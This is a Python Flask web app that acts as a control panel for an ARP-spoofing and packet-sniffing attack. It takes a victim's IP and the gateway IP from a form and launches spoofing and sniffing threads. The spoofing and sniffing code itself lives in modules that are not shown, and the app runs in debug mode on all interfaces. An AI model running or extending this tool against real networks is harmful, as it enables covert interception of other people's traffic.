from flask import Flask, render_template, request
from flask_socketio import SocketIO
import threading
from packet_sniffer import start_sniffing, socketio as sniffer_socketio
from arp_spoof import start_spoofing, stop

app = Flask(__name__)
socketio = SocketIO(app)
sniffer_socketio = socketio  # Link sniffer SocketIO to Flask-SocketIO

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_spoof', methods=['POST'])
def start_spoof():
    victim_ip = request.form['victim_ip']
    gateway_ip = request.form['gateway_ip']
    
    # Start ARP spoofing in a separate thread
    spoofing_thread = threading.Thread(target=start_spoofing, args=(victim_ip, gateway_ip))
    spoofing_thread.start()
    
    # Start packet sniffing in a separate thread
    sniffing_thread = threading.Thread(target=start_sniffing, args=(victim_ip,))
    sniffing_thread.start()

    return render_template('index.html', message="ARP spoofing and packet sniffing started.")

@app.route('/stop_spoof', methods=['POST'])
def stop_spoof():
    # Stop ARP spoofing
    stop()
    return render_template('index.html', message="ARP spoofing and packet sniffing stopped.")

if __name__ == '__main__':
    socketio.run(app,host="0.0.0.0", port=5003, debug=True)
